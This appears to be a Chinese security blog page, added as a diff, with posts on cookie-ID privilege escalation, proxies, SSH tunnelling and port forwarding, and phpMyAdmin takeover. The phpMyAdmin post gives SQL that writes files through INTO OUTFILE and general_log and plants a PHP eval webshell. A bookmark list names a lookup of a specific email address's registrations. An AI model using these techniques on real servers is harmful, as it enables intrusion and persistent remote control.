@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-web漏洞越权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/02/web漏洞越权/" class="article-date">
+  <time datetime="2018-12-01T16:00:00.000Z" itemprop="datePublished">2018-12-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/02/web漏洞越权/">web漏洞之越权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="水平越权实战"><a href="#水平越权实战" class="headerlink" title="水平越权实战"></a>水平越权实战</h1><p>在一次渗透测试中遇到几个经典的水平越权漏洞，以及几个权限绕过。</p>
+<h2 id="增加任意用户的购物车"><a href="#增加任意用户的购物车" class="headerlink" title="增加任意用户的购物车"></a>增加任意用户的购物车</h2><p><img src="https://i.imgur.com/0yHYGCZ.png" alt></p>
+<p>点击加入购物车然后抓包，</p>
+<p><img src="https://i.imgur.com/sJKt4C2.png" alt></p>
+<p>一般越权漏洞都会将信息放在cookie中，严密的都会加token，此次遇到的一个水平越权，验证的信息全部放在cookie里，并且以 userinfo参数验证，耐心测试，后台验证的为ID，也就是说只要你修改对应ID，那么就会加入到对应用户的购物车了，一般这种接口都是网站，所以网站也可能全部都是验证ID。同样存在清空购物车，删除地址漏洞，水平越权。</p>
+<p>此次渗透测试总结一个小经验，在测试后台到底验证什么参数的时候可一个一个抓包，删除其他参数，剩下自己所要尝试的，如果失败更换参数继续测试，也有很多时候他是callback多层认证用户信息，所以可能在后面一个包里，总之耐心点测试，此次测试也发现一个callbackjsonp,为返回用户信息认证，存在用户敏感信息。情况允许的时候可以一套组合拳带走！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/02/web漏洞越权/" data-id="ck0l0oh9p001gpy2imk947e7o" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-正反向代理" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/25/正反向代理/" class="article-date">
+  <time datetime="2018-11-24T16:00:00.000Z" itemprop="datePublished">2018-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/25/正反向代理/">正反向代理</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h1><p>什么是代理服务器（Proxy Serve）？提供代理服务的电脑系统或其它类型的网络终端,代替网络用户去取得网络信息。</p>
+<p>代理服务器（Proxy Server）是一种重要的服务器安全功能，它的工作主要在开放系统互联(OSI)模型的会话层，从而起到防火墙的作用。代理服务器大多被用来连接INTERNET（国际互联网）和Local Area Network（局域网）。</p>
+<p>代理顾名思义，是代替你做一些事情，把事情交给代理，他去帮你做你想做的。举例：你想去女寝取东西，碍于男人身份，找个女同学帮你去取，这个女人同学就是代理。如果女同学想隐藏你的身份就不会告诉宿管阿姨，也可以达到隐匿身份的作用。</p>
+<h1 id="为啥使用代理服务器"><a href="#为啥使用代理服务器" class="headerlink" title="为啥使用代理服务器"></a>为啥使用代理服务器</h1><p>1.提高访问速度<br>由于目标主机返回的数据会存放在代理服务器的硬盘中，因此下一次客户再访问相同的站点数据时，会直接从代理服务器的硬盘中读取，起到了缓存的作用，尤其对于热门网站能明显提高访问速度。</p>
+<p>2.防火墙作用<br>由于所有的客户机请求都必须通过代理服务器访问远程站点，因此可以在代理服务器上设限，过滤掉某些不安全信息。同时正向代理中上网者可以隐藏自己的IP,免受攻击。</p>
+<p>3.突破访问限制<br>互联网上有许多开发的代理服务器，客户机在访问受限时，可通过不受限的代理服务器访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，可以直接访问外网。</p>
+<h1 id="正反向代理区别"><a href="#正反向代理区别" class="headerlink" title="正反向代理区别"></a>正反向代理区别</h1><p>正向代理：</p>
+<p>A同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来A同学的大学老师王老师是马云的同学，于是A同学找到王老师，托王老师帮忙去马云那借500万过来，当然最后事成了。不过马云并不知道这钱是A同学借的，马云是借给王老师的，最后由王老师转交给A同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替A同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。</p>
+<p>我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。用浏览器访问 <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a> 时，被残忍的block，于是你可以在国外搭建一台代理服务器，让代理帮我去请求google.com，代理把请求返回的相应结构再返回给我。</p>
+<p>反向代理：</p>
+<p>大家都有过这样的经历，拨打10086客服电话，可能一个地区的10086客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了10086的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的10086总机号码就是我们说的反向代理。客户不知道真正提供服务人的是谁。</p>
+<p>反向代理隐藏了真实的服务端，当我们请求 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。</p>
+<p>两者的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端，正向代理隐藏真实客户端，反向代理隐藏真实服务端。</p>
+<p>1.位置不同<br>正向代理，架设在客户机和目标主机之间；<br>反向代理，架设在服务器端；<br>2.代理对象不同<br>正向代理，代理客户端，服务端不知道实际发起请求的客户端；</p>
+<p>反向代理，代理服务端，客户端不知道实际提供服务的服务端；   </p>
+<p><img src="https://img-blog.csdn.net/20171231140104634?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenQxNTczMjYyNTg3OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>
+<p><img src="https://img-blog.csdn.net/20171231140104634?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenQxNTczMjYyNTg3OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>
+<p>正向代理–HTTP代理为多个人提供翻墙服务；反向代理–百度外卖为多个商户提供平台给某个用户提供外卖服务。<br>1.用途不同<br>正向代理，为在防火墙内的局域网客户端提供访问Internet的途径；<br>反向代理，将防火墙后面的服务器提供给Internet访问；<br>2.安全性不同<br>正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此必须采取安全措施以确保仅为授权的客户端提供服务；<br>反向代理都对外都是透明的，访问者并不知道自己访问的是哪一个代理。</p>
+<h1 id="正反向代理，模拟vpn"><a href="#正反向代理，模拟vpn" class="headerlink" title="正反向代理，模拟vpn"></a>正反向代理，模拟vpn</h1><p>链接:<a href="https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/" target="_blank" rel="noopener">https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</a></p>
+<hr>
+<p>参考：<a href="https://blog.csdn.net/zt15732625878/article/details/78941268" target="_blank" rel="noopener">https://blog.csdn.net/zt15732625878/article/details/78941268</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/25/正反向代理/" data-id="ck0l0oh9x001ypy2i6y8ns4li" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂/">杂</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-端口映射" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/20/端口映射/" class="article-date">
+  <time datetime="2018-11-19T16:00:00.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/20/端口映射/">端口映射-模拟VPN制作</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="端口映射简介"><a href="#端口映射简介" class="headerlink" title="端口映射简介"></a>端口映射简介</h1><p>百度百科：端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。</p>
+<h1 id="端口映射转发区别"><a href="#端口映射转发区别" class="headerlink" title="端口映射转发区别"></a>端口映射转发区别</h1><p>转发与映射，按理解意思，是用不同的方法实现同样的目标。</p>
+<p>端口转发：你给我了，我打开看看，发现这上面标志显示是要给张三，那么我就给张三去。如果标志是给李四，那我就再给李四去。</p>
+<p>端口映射：你放到我左手，我就直接给张三；你放到我右手，我就直接给李四。这中间我不管你放我手上的是什么东西。</p>
+<p>转发的重点在“转”上面。送快递的过来，把所有快递都交给门口保安，保安再根据每件快递上的收件人来分发。映射，就是在大门口给每个人装个柜子，送快递的直接按收件人名字，把快递放到对应的柜子里面。</p>
+<p>区别不大，实例中在慢慢理解吧!</p>
+<h1 id="端口映射的形象理解"><a href="#端口映射的形象理解" class="headerlink" title="端口映射的形象理解"></a>端口映射的形象理解</h1><p>端口映射就类似一个中转站，三个人，第一个人要找第三个人传递信息必须告诉第二个人，然后第二个人转告第三个人。就字面意思–端口转发。有些时候还有一些妙用，比如网站藏匿端口，访问公网ip:8888端口，映射为内网端口的8080。</p>
+<p>想实现访问公司局域网服务器，IP地址是172.16.1.215，如果我们出差在外，使用的电脑IP地址是192.168.10.215，怎么样去访问局域网服务器的地址172.16.1.215呢;</p>
+<p>此时，我们可以登录局域网服务器所在的路由器，可以通过ipconfig获取网关地址，知道网关后登录到路由器后台，设置端口映射，将内部端口、外部端口设置为3737，内部IP设置为172.16.1.215，个人使用的电脑运行mstsc命令，在窗口中输入公司申请的公网IP+3737，就可以直接访问局域网服务器；</p>
+<h1 id="端口映射与VPN"><a href="#端口映射与VPN" class="headerlink" title="端口映射与VPN"></a>端口映射与VPN</h1><p>端口映射与VPN 目标都是为了从外网访问局域网内网，端口映射和VPN都可以实现远程控制访问</p>
+<p>相同点：端口映射和VPN都可以实现通过外网访问内网。<br>不同点：端口映射将端口暴露在公网中，使用nmap等端口扫描器可扫描，且端口映射数据没有进行加密处理，容易被截取并分析，对系统服务器以及网络安全造成威胁。<br>而VPN 只有通过VPN创建用户，服务器那边的授权，客户端才能进行正常访问，安全性相对较高。</p>
+<p>端口映射相对简单，VPN安全性更高</p>
+<h1 id="VM端口映射"><a href="#VM端口映射" class="headerlink" title="VM端口映射"></a>VM端口映射</h1><p>实例走一下 ，内外网的互通吧。</p>
+<p>前言，要保证VM是nat连接。</p>
+<p>1.打开VM左上角编辑，打开虚拟网络设置。</p>
+<p><img src="https://i.imgur.com/AeFotL9.png" alt></p>
+<p>2.NAT设置如图</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/a7CmzXwK.VzLn.PLqbiCxupZX2A9JP1ZTImErjpYzVo!/b/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=*AEVAgAAAAADF9g!&tl=1&vuin=275640346&tm=1542718800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>3.windows设置出站入站规则</p>
+<p><img src="https://i.imgur.com/GQUFxRM.png" alt></p>
+<p>入站规则，是别人访问自己的端口规则，设置80端口开放，别人就可以访问自己的IP的80端口，而出站规则是自己访问其他网站的端口，测试发现出站规则没看到80端口却可以访问80端口，dl说访问别人端口可能是用类似50000端口去访问别人的80端口，所以我们要访问别人10000端口的时候未必要设置出战规则端口10000。dl说看下tcp三次握手了解下。</p>
+<p>4.测试结果</p>
+<p>使用虚拟机 nc -lvvp 8888</p>
+<p>访问物理机的6666端口即可转发到虚拟机的8888端口，记得设置入站规则6666端口，保证端口开放！先扫描下物理机6666端口。</p>
+<p><img src="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/WdG3p4i1GW11StpHM5bXD2iBwfvG.vKyQ*LKv1yfKdI!/b/dDEBAAAAAAAA&ek=1&kp=1&pt=0&bo=kAJEAQAAAAADJ9U!&tl=1&vuin=275640346&tm=1542718800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>可以看到 监听的6666端口在访问物理机的8888端口的时候成功捕捉到。<br>由物理机6666端口映射到虚拟机的8888端口！<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/GTh0remJT0I9c8pOWtfKZd9h*i8O9Rh*Ga3fx**WDmw!/b/dDYBAAAAAAAA&bo=ZAROAQAAAAADBw0!&rf=viewer_4" alt></p>
+<p>一篇VM 很详细的参考文章：<a href="https://blog.csdn.net/BokeyGeGe/article/details/78631328" target="_blank" rel="noopener">https://blog.csdn.net/BokeyGeGe/article/details/78631328</a></p>
+<h1 id="ssh隧道-重点"><a href="#ssh隧道-重点" class="headerlink" title="ssh隧道(重点)"></a>ssh隧道(重点)</h1><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。但是，SSH还能够将其他TCP端口的网络数据通SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”隧道”（tunneling）。</p>
+<p>这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p>
+<p>下面的VPN制作就用到了ssh隧道技术。</p>
+<h1 id="VM虚拟机模拟VPN翻墙—正向代理"><a href="#VM虚拟机模拟VPN翻墙—正向代理" class="headerlink" title="VM虚拟机模拟VPN翻墙—正向代理"></a>VM虚拟机模拟VPN翻墙—正向代理</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>有三个机器，我们在第一台机器连接第二台机器ssh从而转发端口访问第三台机器。<br>在第一台连接第二台的ssh</p>
+<h2 id="第一次失败实验"><a href="#第一次失败实验" class="headerlink" title="第一次失败实验"></a>第一次失败实验</h2><p>前言：想测试下 三个内网IP 模拟谷歌翻墙，结果发现了点问题记录下!</p>
+<pre><code>win10 target 1   192.168.100.219
+linux target 2   192.168.189.129
+linux target 3   192.168.189.131</code></pre><p>打算模拟谷歌翻墙，首先打开两台linux 80 服务，</p>
+<p><img src="https://i.imgur.com/LdlCmCJ.png" alt></p>
+<p><img src="https://i.imgur.com/KDkfcmW.png" alt></p>
+<p>谷歌翻墙模拟，win10是一台国内被墙拦截的主机，</p>
+<p>linux 2 是一台墙外的一台服务器，可以访问谷歌。</p>
+<p>linux 3 是要访问的服务器。在此代表谷歌。</p>
+<p>第一步：先将win10 IP封禁。</p>
+<p>这里遇到第一个问题，可以看到三个IP 不是全部在同一个IP段，如果 2号 和 3 号互相访问，他们在同一个IP段会直接访问，这里，3号禁止2号IP，可以禁止2号访问，但是3号和1号不在同一个IP段，且物理机与虚拟机之间网路通信貌似还要端口转发之类的或者是直接走物理网卡，反正就是禁了也会被绕过，保证三台服务器在同一个IP段下。全部换成桥接模式，接下来从新测试。</p>
+<h2 id="第二次模拟VPN制作"><a href="#第二次模拟VPN制作" class="headerlink" title="第二次模拟VPN制作"></a>第二次模拟VPN制作</h2><p>从新开始！</p>
+<p>这里虚拟机换成桥接模式。</p>
+<p>重启网络服务  service network restart //更换网络模式要重启网络！</p>
+<pre><code>linux target 1   192.168.100.194
+linux target 2   192.168.100.110
+linux target 3   192.168.100.176</code></pre><p>#第一步 </p>
+<p>服务器3号封禁 linux 1 IP </p>
+<p>iptables -I INPUT -s 192.168.100.160 -j DROP //将linux1的包请求全部丢弃，访问停留几十秒最后无法访问。</p>
+<p>iptables -A INPUT -s 192.168.100.194 -j REJECT   //封禁IP</p>
+<p>iptables -I INPUT -s 192.168.100.219 -p tcp –dport 80 -j ACCEPT 解除限制</p>
+<p>清空封掉的IP地址，可以输入：iptables –flush</p>
+<p>而 2号服务器是可以正常访问 3号模拟谷歌服务器</p>
+<p>这里我们已经禁了一号服务器，一号服务器来访问下三号服务器。</p>
+<p><img src="https://i.imgur.com/8iBLnWK.png" alt></p>
+<p>可以看到一号服务器已无法访问 三号谷歌服务器。</p>
+<p>#第二步<br>端口转发</p>
+<p>首先查看自己开启的端口</p>
+<p><img src="https://i.imgur.com/rO0dudJ.png" alt></p>
+<p>我们选择一个端口1080端口建立动态转发的隧道，</p>
+<p>第一台服务器下的命令：ssh -D 1080 -fN 192.168.100.110//这里我们ssh连接第二台服务器，本地1080端口转发。相当于第二台服务器是一个跳板。</p>
+<p>命令注释：</p>
+<pre><code>选项：-f 后台启用
+-N 不打开远程shell，处于等待状态（不加-N则直接登录进去）
+-g 启用网关功能</code></pre><p>输入密码后登陆成功，在后台运行只是加入了一个进程。</p>
+<p>此时访问 服务器3依然是不成功的。</p>
+<p>设置代理服务器1访问服务器3，命令如下（在服务器1上输入）：</p>
+<pre><code>curl --socks5 127.0.0.1:1080 http://192.168.100.176</code></pre><p><img src="https://i.imgur.com/aOF4pLm.png" alt></p>
+<p>可以看到已经访问到第三台模拟谷歌浏览器</p>
+<p>#第三步</p>
+<p>浏览器设置代理1080端口就可以浏览器便捷的进行访问</p>
+<p><img src="https://i.imgur.com/EOJ4wuA.png" alt><br>代理前</p>
+<p><img src="https://i.imgur.com/LwrLisM.png" alt></p>
+<p>代理后，成功访问</p>
+<p><img src="https://i.imgur.com/7F4R3mg.png" alt></p>
+<p>如果有大陆以外的服务器，那么便可以自己制作VPN翻墙。简单使用！</p>
+<h1 id="利用跳板转发端口"><a href="#利用跳板转发端口" class="headerlink" title="利用跳板转发端口"></a>利用跳板转发端口</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>有三个机器，我们在第二台跳板机器执行命令，从而使得一号和三号机器可以互相访问。</p>
+<p>连接模式：桥接</p>
+<pre><code>linux target 1   192.168.100.110
+linux target 2   192.168.100.194
+linux target 3   192.168.100.176</code></pre><p>首先，我们先模拟环境，用三号服务器封禁一号服务器的IP，</p>
+<p>root@kali:~# iptables -A INPUT -s 192.168.100.110 -j REJECT//禁止IP访问任意端口</p>
+<p><img src="https://i.imgur.com/BbcqoB2.png" alt></p>
+<p>可以看到禁止192.168.100.110IP访问本机的任意端口</p>
+<p>我们使用三号服务器nc监听23端口。一号已经连接不到三号的23端口。二号服务器可以连接三号服务器23端口。环境搭建完毕。</p>
+<p>root@kali:~# nc -lvvp 23</p>
+<p>未完待续！</p>
+<p>然后在第二台主机输入命令 </p>
+<p>ssh -R 9527:192.168.100.176:23 -fN 192.168.100.110</p>
+<p>然后我们在 第一台服务器上执行 telnet 127.0.0.1 9527即可访问。</p>
+<p>可以看到nc监听的第三台机器 </p>
+<p><img src="https://i.imgur.com/qEMogZh.png" alt></p>
+<p>可以看到数据是从192.168.100.194（第三台主机）转发过来的</p>
+<p>设置VPN   </p>
+<p>在第二台主机输入命令 </p>
+<p>ssh -R 1080:192.168.100.176:80 -fN 192.168.100.110</p>
+<p>然后我们在 第一台服务器上执行 telnet 127.0.0.1 1080即可访问。</p>
+<p><img src="https://i.imgur.com/xYT2eMJ.png" alt></p>
+<p>可以正常访问网页了。<br>浏览器设置代理。</p>
+<hr>
+<p>参考：<a href="https://www.cnblogs.com/phpdragon/p/5314650.html" target="_blank" rel="noopener">https://www.cnblogs.com/phpdragon/p/5314650.html</a><br>参考：<a href="https://www.cnblogs.com/keerya/p/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/p/7612715.html</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/20/端口映射/" data-id="ck0l0oh9z0024py2ikcp0e651" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂/">杂</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-phpmyadmin拿shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/18/phpmyadmin拿shell/" class="article-date">
+  <time datetime="2018-11-17T16:00:00.000Z" itemprop="datePublished">2018-11-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/18/phpmyadmin拿shell/">phpmyadmin两种拿shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p>
+<h1 id="暴绝对路径"><a href="#暴绝对路径" class="headerlink" title="暴绝对路径"></a>暴绝对路径</h1><p>要写文件必须要知道根路径，否则即使写入了也无法访问，也就自然无法getshell，</p>
+<h1 id="phpmyadmin直接写入文件"><a href="#phpmyadmin直接写入文件" class="headerlink" title="phpmyadmin直接写入文件"></a>phpmyadmin直接写入文件</h1><p>先要知道根路径利用错误爆路径等，这里用phpinfo查看根路径</p>
+<p><img src="https://i.imgur.com/1smbgme.png" alt></p>
+<p>写入 一句phpinfo文件，</p>
+<pre><code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE  &quot;E:\\wamp\\wamp\\www\\2.php&quot;</code></pre><p>这里必须注意要双反斜线，否则会转义，</p>
+<p><img src="https://i.imgur.com/4k6pFOy.png" alt></p>
+<p>可以看到已经上传并且解析</p>
+<p><img src="https://i.imgur.com/CuKvzMG.png" alt></p>
+<h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell"></a>利用日志getshell</h1><p>原理，phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell</p>
+<p>第一步手动开启日志。</p>
+<p>set global  general_log=’on’   //首先设置为on</p>
+<p>然后 查看是否开启成功</p>
+<p>show variables like “general_log%”</p>
+<p><img src="https://i.imgur.com/8qUo2mX.png" alt></p>
+<p>ON为开启，此时我们设置 日志路径</p>
+<pre><code>set global  general_log_file =&quot;E:\\wamp\\wamp\\www\\3.php&quot;</code></pre><p><img src="https://i.imgur.com/gwGGN5Z.png" alt></p>
+<p>然后只要执行的语句都会写入到日志文件中，所以我们查询语句<br>select ‘<?php eval($_POST['a']);?>‘</p>
+<p><img src="https://i.imgur.com/gkZ3kfr.png" alt></p>
+<p>会报错但是已经写入到日志中去了</p>
+<p><img src="https://i.imgur.com/RQaAHeN.png" alt></p>
+<p>此时连接网站/3.php即可getshell。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/18/phpmyadmin拿shell/" data-id="ck0l0oh9h000xpy2ic6h13kgz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-网址收藏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/18/网址收藏/" class="article-date">
+  <time datetime="2018-11-17T16:00:00.000Z" itemprop="datePublished">2018-11-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/18/网址收藏/">个人网址收藏</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="web渗透博客"><a href="#web渗透博客" class="headerlink" title="web渗透博客"></a>web渗透博客</h1><p><a href="https://chybeta.github.io/2017/08/19/Web-Security-Learning/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/19/Web-Security-Learning/</a></p>
+<h1 id="php代码审计入门总结"><a href="#php代码审计入门总结" class="headerlink" title="php代码审计入门总结"></a>php代码审计入门总结</h1><p><a href="http://www.360doc.com/content/16/0215/14/26186435_534767147.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/16/0215/14/26186435_534767147.shtml</a></p>
+<p><a href="http://www.am0s.com/" target="_blank" rel="noopener">http://www.am0s.com/</a></p>
+<h1 id="CTF工具库"><a href="#CTF工具库" class="headerlink" title="CTF工具库"></a>CTF工具库</h1><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a></p>
+<h1 id="子域名在线接口"><a href="#子域名在线接口" class="headerlink" title="子域名在线接口"></a>子域名在线接口</h1><p><a href="http://ce.baidu.com" target="_blank" rel="noopener">http://ce.baidu.com</a></p>
+<p><a href="http://look.mimaz.org" target="_blank" rel="noopener">http://look.mimaz.org</a></p>
+<h1 id="解密cms识别等综合工具"><a href="#解密cms识别等综合工具" class="headerlink" title="解密cms识别等综合工具"></a>解密cms识别等综合工具</h1><p><a href="http://tools.bugscaner.com/（实用）" target="_blank" rel="noopener">http://tools.bugscaner.com/（实用）</a></p>
+<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p>
+<p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p>
+<pre><code>开源：https://github.com/TideSec/TideFinger?tdsourcetag=s_pcqq_aiomsg</code></pre><p>wtf_scan</p>
+<pre><code>开源：https://github.com/dyboy2017/WTF_Scan</code></pre><h1 id="社工注册过网站的手机号邮箱"><a href="#社工注册过网站的手机号邮箱" class="headerlink" title="社工注册过网站的手机号邮箱"></a>社工注册过网站的手机号邮箱</h1><p><a href="https://www.reg007.com/s/798648772-at-qq.com//" target="_blank" rel="noopener">https://www.reg007.com/s/798648772-at-qq.com//</a></p>
+<h1 id="网盘爬虫"><a href="#网盘爬虫" class="headerlink" title="网盘爬虫"></a>网盘爬虫</h1><p><a href="http://tansuo233.com" target="_blank" rel="noopener">http://tansuo233.com</a></p>
